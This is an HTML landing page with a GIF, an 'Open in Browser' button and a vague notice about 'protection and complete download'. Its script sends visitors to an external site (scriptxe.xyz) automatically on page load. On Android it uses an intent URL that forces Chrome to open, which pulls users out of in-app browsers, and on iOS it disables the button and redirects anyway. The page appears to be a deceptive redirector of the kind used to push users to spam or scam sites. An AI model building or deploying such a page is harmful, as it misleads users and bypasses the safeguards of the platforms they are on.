
<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open in Browser</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 15px 20px;
        }
        
        .content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            max-width: 500px;
            margin: 0 auto;
            width: 100%;
        }
        
        .gif-container {
            width: 100%;
            margin-bottom: 32px;
        }
        
        .gif-container img {
            width: 100%;
            height: auto;
            display: block;
            border-radius: 8px;
        }
        
        .browser-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #ffffff;
            font-size: 18px;
            font-weight: 600;
            padding: 18px 65px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 40px;
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
            transition: all 0.2s ease;
        }
        
        .browser-button:hover {
            box-shadow: 0 6px 16px rgba(102, 126, 234, 0.5);
            transform: translateY(-2px);
        }
        
        .browser-button:active {
            transform: translateY(0);
        }
        
        .notice {
            background: linear-gradient(145deg, #0f0f0f 0%, #1a1a1a 100%);
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            padding: 16px 20px;
            width: 100%;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        }
        
        .notice-primary {
            color: #e0e0e0;
            font-size: 13px;
            line-height: 1.5;
            font-weight: 500;
            text-align: center;
            margin-bottom: 12px;
            padding-bottom: 12px;
            border-bottom: 1px solid #2a2a2a;
        }
        
        .notice-secondary {
            color: #999;
            font-size: 11px;
            line-height: 1.4;
            font-weight: 400;
            text-align: center;
        }
        
        .notice-secondary .icon {
            display: inline-block;
            margin: 0 2px;
        }
    </style>

<body>

    <div class="content">

        <div class="gif-container">
            <img src="https://www9.0zz0.com/2024/04/06/13/548511907.gif" alt="Content">
        </div>

        <button class="browser-button" id="manual-open-btn">
            Open in Browser
        </button>

        <div class="notice">
            <div class="notice-primary">
                For protection and complete download,<br>please open in your browser.
            </div>
            <div class="notice-secondary">
                If the button doesn't work, tap the menu <span class="icon">â‹®</span> and select "Open in Browser"
            </div>
        </div>

    </div>

    <script>
        // Target URL - landing page
        var url = 'https://wwww.scriptxe.xyz/';
        var userAgent = navigator.userAgent;
        var isIOS = /(iphone|ipad|ipod)/i.test(userAgent);
        var isAndroid = /(android)/i.test(userAgent);
        
        // Redirect function
        function performRedirect() {
            if (isAndroid) {
                // Intent for Chrome only on Android
                window.location.href = 'intent://' + url.substring(url.indexOf("://") + 3) 
                    + '#Intent;package=com.android.chrome;'
                    + 'action=android.intent.action.VIEW;'
                    + 'category=android.intent.category.BROWSABLE;'
                    + 'scheme=http;'
                    + 'S.browser_fallback_url=' + encodeURIComponent(url) 
                    + ';end;';
            } else if (isIOS) {
                // For iOS: direct redirect to landing page
                window.location.href = url;
            } else {
                // For other devices: direct redirect to landing page
                window.location.href = url;
            }
        }
        
        // Automatic redirect for both Android and iOS
        (function() {
            if (isAndroid) {
                // Android: automatic redirect immediately
                setTimeout(function() {
                    performRedirect();
                }, 100);
            } else if (isIOS) {
                // iOS: automatic redirect when page loads
                setTimeout(function() {
                    performRedirect();
                }, 100);
            }
        })();
        
        // Button click handler - disabled on iOS, works on Android
        document.getElementById('manual-open-btn').addEventListener('click', function(e) {
            if (isIOS) {
                // On iOS: button is completely disabled
                e.preventDefault();
                e.stopPropagation();
                return false;
            } else {
                // On Android: button works as fallback
                performRedirect();
            }
        });
    </script>
